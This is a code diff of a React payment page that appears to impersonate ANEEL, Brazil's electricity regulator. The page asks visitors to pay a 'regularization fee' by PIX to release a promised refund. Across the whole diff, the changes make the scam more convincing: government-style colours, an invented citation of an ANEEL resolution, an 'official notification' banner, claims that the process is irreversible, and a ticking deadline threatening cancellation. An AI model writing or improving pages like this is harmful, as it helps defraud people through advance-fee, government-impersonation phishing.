@@ -471,87 +471,190 @@ export default function PagamentoPix() {
               </div>
             </div>
             
-            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">DETALHES DA RESTITUIÇÃO</div>
-            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
-              <div className="flex flex-wrap -mx-2">
-                <div className="w-full md:w-1/3 px-2 mb-3 md:mb-0">
-                  <div className="p-3 bg-gray-100 rounded-md h-full">
-                    <p className="text-xs text-gray-500 mb-1">Taxa de Regularização</p>
-                    <p className="font-medium text-red-600">{valorTaxaFormatado}</p>
+            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
+              <div className="bg-white/20 p-1.5 rounded-md mr-2">
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
+                </svg>
+              </div>
+              DETALHES DA RESTITUIÇÃO
+            </div>
+            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div className="bg-gradient-to-br from-red-50 to-red-100 rounded-lg shadow-sm p-4 border border-red-200">
+                  <div className="flex items-center mb-2">
+                    <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center mr-3">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                      </svg>
+                    </div>
+                    <div>
+                      <p className="text-xs font-medium text-red-800 uppercase tracking-wide">Taxa de Regularização</p>
+                      <p className="font-bold text-red-600 text-lg">{valorTaxaFormatado}</p>
+                    </div>
                   </div>
+                  <p className="text-xs text-red-800 mt-2 pl-11">Pagamento único para liberação da restituição</p>
                 </div>
-                <div className="w-full md:w-1/3 px-2 mb-3 md:mb-0">
-                  <div className="p-3 bg-gray-100 rounded-md h-full">
-                    <p className="text-xs text-gray-500 mb-1">Valor aprovado</p>
-                    <p className="font-medium text-green-600">{valorFormatado}</p>
+                
+                <div className="bg-gradient-to-br from-green-50 to-green-100 rounded-lg shadow-sm p-4 border border-green-200">
+                  <div className="flex items-center mb-2">
+                    <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center mr-3">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2z" />
+                      </svg>
+                    </div>
+                    <div>
+                      <p className="text-xs font-medium text-green-800 uppercase tracking-wide">Valor aprovado</p>
+                      <p className="font-bold text-green-600 text-lg">{valorFormatado}</p>
+                    </div>
                   </div>
+                  <p className="text-xs text-green-800 mt-2 pl-11">Valor total a ser depositado</p>
                 </div>
-                <div className="w-full md:w-1/3 px-2">
-                  <div className="p-3 bg-gray-100 rounded-md h-full">
-                    <p className="text-xs text-gray-500 mb-1">Prazo de pagamento</p>
-                    <p className="font-medium text-amber-600">{formatarTempo(tempoRestante)}</p>
+                
+                <div className="bg-gradient-to-br from-amber-50 to-amber-100 rounded-lg shadow-sm p-4 border border-amber-200">
+                  <div className="flex items-center mb-2">
+                    <div className="w-8 h-8 bg-amber-500 rounded-full flex items-center justify-center mr-3">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                      </svg>
+                    </div>
+                    <div>
+                      <p className="text-xs font-medium text-amber-800 uppercase tracking-wide">Prazo de pagamento</p>
+                      <p className="font-bold text-amber-600 text-lg">{formatarTempo(tempoRestante)}</p>
+                    </div>
                   </div>
+                  <p className="text-xs text-amber-800 mt-2 pl-11 flex items-center">
+                    <span className="inline-block w-2 h-2 bg-amber-500 rounded-full mr-1 animate-pulse"></span>
+                    Tempo restante para pagamento
+                  </p>
                 </div>
               </div>
               
-              <div className="mt-4 bg-blue-50 p-3 border-l-4 border-blue-400 rounded-r-md">
+              <div className="mt-5 bg-[#E5F0FF] p-4 rounded-lg border border-[#1351B4]/30 shadow-sm">
                 <div className="flex items-start">
-                  <div className="text-blue-500 mt-1 mr-2">
-                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <div className="bg-[#1351B4] rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
+                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                     </svg>
                   </div>
                   <div>
-                    <p className="text-sm text-blue-800 font-medium">Importante: <span className="font-normal">Prazo de depósito</span></p>
-                    <p className="text-xs text-gray-600 mt-1">Após a confirmação do pagamento da Taxa de Regularização, o valor de {valorFormatado} será depositado em sua conta bancária em até 72 horas úteis.</p>
+                    <p className="text-[#071D41] font-semibold text-sm mb-1">Informações sobre o depósito</p>
+                    <p className="text-gray-700 text-sm">Após a confirmação do pagamento da Taxa de Regularização, o valor de <span className="font-semibold text-green-700">{valorFormatado}</span> será depositado em sua conta bancária em até <span className="font-semibold">72 horas úteis</span>.</p>
+                    <div className="mt-2 bg-white/50 rounded p-2 border border-[#1351B4]/20 text-xs text-gray-600">
+                      <p>Conforme resolução ANEEL nº 1.000/2021, o processo de restituição é <span className="font-medium text-[#071D41]">irreversível</span> após a confirmação do pagamento da TRE. Os valores serão depositados na conta bancária informada em seu cadastro.</p>
+                    </div>
                   </div>
                 </div>
               </div>
             </div>
             
-            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">PAGAMENTO VIA PIX</div>
-            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
-              <div className="mb-4">
+            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
+              <div className="bg-white/20 p-1.5 rounded-md mr-2">
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                </svg>
+              </div>
+              PAGAMENTO VIA PIX
+            </div>
+            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
+              <div className="mb-5">
                 <div className="flex justify-center">
                   <Tabs defaultValue="qrcode" className="w-full">
-                    <TabsList className="w-full mb-4">
-                      <TabsTrigger value="qrcode" className="flex-1">QR Code PIX</TabsTrigger>
-                      <TabsTrigger value="copiacola" className="flex-1">Copia e Cola</TabsTrigger>
+                    <TabsList className="w-full mb-6 bg-gray-100 p-1 rounded-lg">
+                      <TabsTrigger value="qrcode" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
+                        <div className="flex items-center justify-center gap-2 py-1">
+                          <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z" />
+                          </svg>
+                          QR Code PIX
+                        </div>
+                      </TabsTrigger>
+                      <TabsTrigger value="copiacola" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
+                        <div className="flex items-center justify-center gap-2 py-1">
+                          <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                          </svg>
+                          Copia e Cola
+                        </div>
+                      </TabsTrigger>
                     </TabsList>
                     
                     <TabsContent value="qrcode" className="mt-2">
                       <div className="flex flex-col items-center justify-center">
                         {isLoading ? (
-                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
-                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
-                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
+                          <div className="py-10 flex flex-col items-center justify-center space-y-3">
+                            <div className="relative">
+                              <div className="w-16 h-16 border-4 border-[#1351B4] border-opacity-20 rounded-full"></div>
+                              <Loader className="h-16 w-16 text-[#1351B4] animate-spin absolute top-0" />
+                            </div>
+                            <p className="text-[#071D41] font-medium mt-3">Gerando código de pagamento...</p>
                           </div>
                         ) : !paymentInfo ? (
-                          <div className="py-8 text-center space-y-4">
-                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
-                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
+                          <div className="py-10 text-center space-y-4">
+                            <div className="bg-red-50 rounded-full p-4 mx-auto w-20 h-20 flex items-center justify-center">
+                              <AlertCircle className="h-10 w-10 text-red-500" />
+                            </div>
+                            <p className="text-red-600 font-medium">Não foi possível gerar o código PIX</p>
                             <Button 
                               onClick={criarPagamento} 
-                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
+                              className="bg-[#1351B4] hover:bg-[#0D47A1] transition-colors duration-300"
                             >
                               Tentar Novamente
                             </Button>
                           </div>
                         ) : (
-                          <>
-                            <div className="border-4 border-[var(--gov-blue)] rounded-lg p-3 mb-4 bg-white max-w-xs">
-                              <img 
-                                src={paymentInfo.pixQrCode}
-                                alt="QR Code do PIX" 
-                                className="w-full h-auto" 
-                              />
+                          <div className="grid md:grid-cols-2 gap-6 items-center">
+                            <div className="order-2 md:order-1">
+                              <div className="bg-gradient-to-r from-[#071D41] to-[#1351B4] rounded-lg p-5 text-white">
+                                <h3 className="font-bold text-lg mb-3">Dados do Pagamento</h3>
+                                <div className="space-y-3">
+                                  <div className="flex justify-between border-b border-white/20 pb-2">
+                                    <span className="text-gray-200">Valor:</span>
+                                    <span className="font-bold text-[#FFCD07]">{valorTaxaFormatado}</span>
+                                  </div>
+                                  <div className="flex justify-between border-b border-white/20 pb-2">
+                                    <span className="text-gray-200">Descrição:</span>
+                                    <span>TRE - Taxa de Regularização</span>
+                                  </div>
+                                  <div className="flex justify-between border-b border-white/20 pb-2">
+                                    <span className="text-gray-200">Vencimento:</span>
+                                    <span className="font-medium">{formatarTempo(tempoRestante)}</span>
+                                  </div>
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-200">Para:</span>
+                                    <span className="font-medium">ANEEL - Ag. Nacional</span>
+                                  </div>
+                                </div>
+                              </div>
+                              
+                              <div className="bg-amber-50 border-l-4 border-amber-400 p-3 mt-4 rounded-r-md shadow-sm">
+                                <div className="flex items-start">
+                                  <div className="flex-shrink-0 mt-0.5">
+                                    <AlertCircle className="h-5 w-5 text-amber-500" />
+                                  </div>
+                                  <div className="ml-3">
+                                    <p className="text-sm text-amber-800">
+                                      Após fazer o pagamento, clique no botão <span className="font-bold">"Já fiz o pagamento"</span> abaixo para verificar e prosseguir.
+                                    </p>
+                                  </div>
+                                </div>
+                              </div>
                             </div>
-                            <div className="bg-gray-50 w-full max-w-sm p-4 rounded-lg text-center border border-gray-200">
-                              <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
-                              <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
-                              <p className="text-xs text-gray-500 mt-1">TRE - Taxa de Regularização Energética</p>
+                            
+                            <div className="order-1 md:order-2 flex flex-col items-center">
+                              <div className="border-4 border-[#1351B4] rounded-lg p-4 mb-2 bg-white max-w-xs shadow-lg">
+                                <div className="bg-[#F8F9FA] p-2 rounded-md mb-2 text-center">
+                                  <p className="text-xs text-gray-500">Escaneie o QR Code</p>
+                                </div>
+                                <img 
+                                  src={paymentInfo.pixQrCode}
+                                  alt="QR Code do PIX" 
+                                  className="w-full h-auto" 
+                                />
+                              </div>
+                              <p className="text-sm text-gray-600 text-center">Use a câmera do seu aplicativo bancário<br/>para escanear este QR Code</p>
                             </div>
-                          </>
+                          </div>
                         )}
                       </div>
                     </TabsContent>
@@ -559,46 +662,96 @@ export default function PagamentoPix() {
                     <TabsContent value="copiacola" className="mt-2">
                       <div>
                         {isLoading ? (
-                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
-                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
-                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
+                          <div className="py-10 flex flex-col items-center justify-center space-y-3">
+                            <div className="relative">
+                              <div className="w-16 h-16 border-4 border-[#1351B4] border-opacity-20 rounded-full"></div>
+                              <Loader className="h-16 w-16 text-[#1351B4] animate-spin absolute top-0" />
+                            </div>
+                            <p className="text-[#071D41] font-medium mt-3">Gerando código de pagamento...</p>
                           </div>
                         ) : !paymentInfo ? (
-                          <div className="py-8 text-center space-y-4">
-                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
-                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
+                          <div className="py-10 text-center space-y-4">
+                            <div className="bg-red-50 rounded-full p-4 mx-auto w-20 h-20 flex items-center justify-center">
+                              <AlertCircle className="h-10 w-10 text-red-500" />
+                            </div>
+                            <p className="text-red-600 font-medium">Não foi possível gerar o código PIX</p>
                             <Button 
                               onClick={criarPagamento} 
-                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
+                              className="bg-[#1351B4] hover:bg-[#0D47A1] transition-colors duration-300"
                             >
                               Tentar Novamente
                             </Button>
                           </div>
                         ) : (
-                          <>
-                            <p className="text-sm text-gray-600 mb-2 text-center">Copie o código abaixo:</p>
-                            <div className="flex items-center max-w-xl mx-auto">
-                              <div className="flex-1 bg-white border border-gray-300 p-3 rounded-l-md font-mono text-xs break-all">
-                                {codigoPix}
+                          <div className="grid md:grid-cols-2 gap-6 items-center">
+                            <div>
+                              <div className="bg-[#F0F5FF] rounded-lg p-5 border border-[#1351B4]/20 shadow-sm">
+                                <h3 className="font-bold text-[#071D41] mb-3 flex items-center text-lg">
+                                  <Copy className="mr-2 h-5 w-5 text-[#1351B4]" />
+                                  Copie o código PIX
+                                </h3>
+                                
+                                <div className="flex items-center mb-4">
+                                  <div className="flex-1 bg-white border border-gray-300 p-3 rounded-l-md font-mono text-xs break-all">
+                                    {codigoPix}
+                                  </div>
+                                  <button 
+                                    onClick={copiarCodigoPix}
+                                    className="bg-[#1351B4] text-white p-3 rounded-r-md hover:bg-[#0D47A1] transition-colors duration-300"
+                                  >
+                                    {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
+                                  </button>
+                                </div>
+                                
+                                <div className="bg-white p-4 rounded-md border border-gray-200">
+                                  <h4 className="font-semibold mb-3 text-[#071D41] flex items-center">
+                                    <div className="bg-[#1351B4] rounded-full w-5 h-5 flex items-center justify-center mr-2 text-white text-xs">?</div>
+                                    Como pagar com o PIX Copia e Cola:
+                                  </h4>
+                                  <ol className="list-decimal pl-5 space-y-2 text-sm text-gray-700">
+                                    <li>Clique no botão azul acima para copiar o código</li>
+                                    <li>Abra o aplicativo do seu banco</li>
+                                    <li>Vá para a área de PIX ou pagamentos</li>
+                                    <li>Selecione a opção "Pix Copia e Cola"</li>
+                                    <li>Cole o código e confirme o pagamento</li>
+                                  </ol>
+                                </div>
                               </div>
-                              <button 
-                                onClick={copiarCodigoPix}
-                                className="bg-[var(--gov-blue)] text-white p-3 rounded-r-md hover:bg-[var(--gov-blue-dark)]"
-                              >
-                                {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
-                              </button>
                             </div>
-                            <div className="bg-gray-100 p-4 rounded-md text-gray-700 text-sm mt-4 max-w-xl mx-auto">
-                              <h4 className="font-semibold mb-2">Como pagar com o PIX Copia e Cola:</h4>
-                              <ol className="list-decimal pl-5 space-y-1">
-                                <li>Clique no botão azul acima para copiar o código</li>
-                                <li>Abra o aplicativo do seu banco</li>
-                                <li>Vá para a área de PIX ou pagamentos</li>
-                                <li>Selecione a opção "Pix Copia e Cola"</li>
-                                <li>Cole o código e confirme o pagamento</li>
-                              </ol>
+                            
+                            <div>
+                              <div className="bg-gradient-to-r from-[#071D41] to-[#1351B4] rounded-lg p-5 text-white shadow-sm">
+                                <h3 className="font-bold text-lg mb-3">Dados do Pagamento</h3>
+                                <div className="space-y-3">
+                                  <div className="flex justify-between border-b border-white/20 pb-2">
+                                    <span className="text-gray-200">Valor:</span>
+                                    <span className="font-bold text-[#FFCD07]">{valorTaxaFormatado}</span>
+                                  </div>
+                                  <div className="flex justify-between border-b border-white/20 pb-2">
+                                    <span className="text-gray-200">Descrição:</span>
+                                    <span>TRE - Taxa de Regularização</span>
+                                  </div>
+                                  <div className="flex justify-between border-b border-white/20 pb-2">
+                                    <span className="text-gray-200">Vencimento:</span>
+                                    <span className="font-medium">{formatarTempo(tempoRestante)}</span>
+                                  </div>
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-200">Para:</span>
+                                    <span className="font-medium">ANEEL - Ag. Nacional</span>
+                                  </div>
+                                </div>
+                                
+                                <div className="bg-[#1F61C8]/60 backdrop-blur-sm rounded-md p-3 mt-4 border border-[#FFFFFF]/20">
+                                  <div className="flex items-start">
+                                    <AlertCircle className="h-5 w-5 text-[#FFCD07] flex-shrink-0 mt-0.5 mr-2" />
+                                    <p className="text-sm">
+                                      Após fazer o pagamento, clique no botão <span className="font-bold">"Já fiz o pagamento"</span> abaixo para verificar.
+                                    </p>
+                                  </div>
+                                </div>
+                              </div>
                             </div>
-                          </>
+                          </div>
                         )}
                       </div>
                     </TabsContent>
@@ -610,39 +763,49 @@ export default function PagamentoPix() {
                 <Button 
                   onClick={verificarStatusPagamento}
                   disabled={!paymentInfo || isLoading || paymentStatus === 'completed'}
-                  className={`w-full font-bold py-6 text-lg mb-3 transition-all duration-300 transform hover:scale-105 ${
+                  className={`w-full font-bold py-6 text-lg mb-5 transition-all duration-300 ${
                     paymentStatus === 'completed' 
-                      ? 'bg-green-500 hover:bg-green-600 text-white' 
-                      : 'bg-[var(--gov-green)] hover:bg-[var(--gov-green)]/90 text-white'
+                      ? 'bg-green-600 hover:bg-green-700 text-white shadow-md shadow-green-600/20' 
+                      : 'bg-[#1351B4] hover:bg-[#0D47A1] text-white shadow-md shadow-blue-600/20'
                   }`}
                 >
                   {paymentStatus === 'completed' ? (
                     <div className="flex items-center justify-center">
-                      <CheckCircle className="mr-2 h-5 w-5" />
+                      <CheckCircle className="mr-2 h-6 w-6" />
                       Pagamento Confirmado
                     </div>
                   ) : isLoading ? (
                     <div className="flex items-center justify-center">
                       <Loader className="mr-2 h-5 w-5 animate-spin" />
-                      Verificando...
+                      Verificando Pagamento...
                     </div>
                   ) : (
-                    "Já fiz o pagamento"
+                    <div className="flex items-center justify-center">
+                      <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                      </svg>
+                      Já fiz o pagamento
+                    </div>
                   )}
                 </Button>
                 
-                <div className="bg-red-600 p-4 rounded-md mb-4 text-white shadow-md">
-                  <div className="flex items-center mb-2">
-                    <AlertTriangle className="h-5 w-5 text-yellow-300 mr-2" />
-                    <h3 className="font-bold text-base">NOTIFICAÇÃO OFICIAL</h3>
+                <div className="bg-gradient-to-r from-red-600 to-red-700 p-5 rounded-lg text-white shadow-md">
+                  <div className="flex items-center mb-3">
+                    <div className="bg-white/20 p-1.5 rounded-full mr-3">
+                      <AlertTriangle className="h-5 w-5 text-[#FFCD07]" />
+                    </div>
+                    <h3 className="font-bold text-base tracking-wide">NOTIFICAÇÃO OFICIAL</h3>
                   </div>
-                  <p className="mb-3 text-sm">
+                  <p className="mb-4 text-sm leading-relaxed">
                     Ao prosseguir, você concordou com o pagamento da Taxa de Regularização no valor de <strong>{valorTaxaFormatado}</strong>. 
                     Conforme a resolução ANEEL nº 1.000/2021, o não pagamento resultará em <strong>cancelamento automático</strong> da sua solicitação de restituição.
                   </p>
-                  <p className="font-semibold text-sm">
-                    Efetue o pagamento em até <span className="font-bold">{formatarTempo(tempoRestante)}</span> para garantir sua restituição de <strong>{valorFormatado}</strong>.
-                  </p>
+                  <div className="bg-red-700/50 p-3 rounded-md border border-white/10">
+                    <p className="font-medium text-sm flex items-center">
+                      <span className="inline-block w-2 h-2 bg-[#FFCD07] rounded-full mr-2 animate-pulse"></span>
+                      Efetue o pagamento em até <span className="font-bold mx-1">{formatarTempo(tempoRestante)}</span> para garantir sua restituição de <strong className="ml-1">{valorFormatado}</strong>.
+                    </p>
+                  </div>
                 </div>
               </div>
             </div>
